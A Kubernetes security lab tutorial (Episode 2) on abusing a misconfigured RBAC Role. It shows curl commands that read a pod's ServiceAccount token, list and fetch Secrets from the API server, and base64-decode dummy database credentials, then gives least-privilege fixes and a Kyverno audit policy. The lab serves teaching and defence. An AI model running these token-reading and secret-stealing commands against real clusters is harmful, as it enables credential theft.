# Episode 2 – The RBAC Mistake

In Episode 1, we hit a wall: **403 Forbidden**. The default ServiceAccount had no permissions.

In this episode, we assume:
> A developer or admin has granted "read-only" permissions to the ServiceAccount so the application can read its configuration.
> However, they were too generous and included **Secrets**.

Our goal here is to:
- **Exploit the misconfigured RBAC** permissions.
- **List Kubernetes Secrets** in the namespace.
- **Retrieve and Decode** a sensitive secret (e.g., database credentials).

## 1. Setup the Lab (The Mistake)

We will apply a `Role` and `RoleBinding` that grants the `default` ServiceAccount permission to list and get Secrets. We also create a dummy secret to steal.

From the root of this repo:

```bash
kubectl apply -f episodes/ep2-rbac-misconfig/manifests/
```

This command:
- Creates a Secret named `super-secret-db-creds`.
- Creates a Role `secret-reader` (allows `get`, `list` on `secrets`).
- Creates a RoleBinding binding the `default` ServiceAccount to `secret-reader`.

## 2. Enter the Pod

If you are not already inside from Episode 1:

```bash
kubectl -n battleground exec -it deploy/demo-app -- sh
```

## 3. The Attack: Stealing Secrets

### 3.1. Setup Variables

Just like in Ep1, set up your environment:

```sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

### 3.2. List Secrets

In Ep1, listing pods failed. Now, let's try listing secrets.

```sh
curl -s --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets"
```

**Output:**

```json
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "items": [
    {
      "metadata": {
        "name": "super-secret-db-creds",
        "namespace": "battleground"
      },
      "type": "Opaque"
    }
  ]
}
```

### 3.3. Read the Target Secret

Now that we know the name of the secret (`super-secret-db-creds`), let's read it.

```sh
curl -s --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/super-secret-db-creds"
```

**Output:**

```json
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "super-secret-db-creds",
    "namespace": "battleground"
  },
  "data": {
    "password": "VGhpc0lzVGhlUGFzc3dvcmQxMjMh",
    "username": "YWRtaW4="
  },
  "type": "Opaque"
}
```

### 3.4. Decode the Loot

Kubernetes secrets are base64 encoded, not encrypted (at the API level).

If you have `base64` installed in the pod (our nginx image might not, but let's check):

```sh
# Decode Username
echo "YWRtaW4=" | base64 -d
# Output: admin

# Decode Password
echo "VGhpc0lzVGhlUGFzc3dvcmQxMjMh" | base64 -d
# Output: ThisIsThePassword123!
```

If `base64` is missing, you can use `openssl` (if available) or just copy the string to your local machine to decode.

## 4. Fix: Least Privilege

- **Never** grant `list` or `get` on `secrets` unless absolutely necessary.
- If an app needs a specific secret, mount it as a volume or environment variable. **Do not** give API access to secrets.
- Use tools like **Kyverno** or **OPA Gatekeeper** to audit and block overly permissive roles.

## 5. Blue Team Corner (Defense in Depth) 🛡️

Check the `defense/` folder for secure examples.

1.  **Secure RBAC (`defense/secure-rbac.yaml`):**
    - A Role that only allows `get/list` on `pods`, explicitly excluding `secrets`.
    - This follows the Principle of Least Privilege.

2.  **Policy as Code (`defense/kyverno-policy.yaml`):**
    - A Kyverno policy that **audits or blocks** any Role/ClusterRole that grants access to `secrets`.
    - This prevents developers from accidentally (or maliciously) creating unsafe roles.

**Try it out:**
```bash
kubectl apply -f episodes/ep2-rbac-misconfig/defense/
```

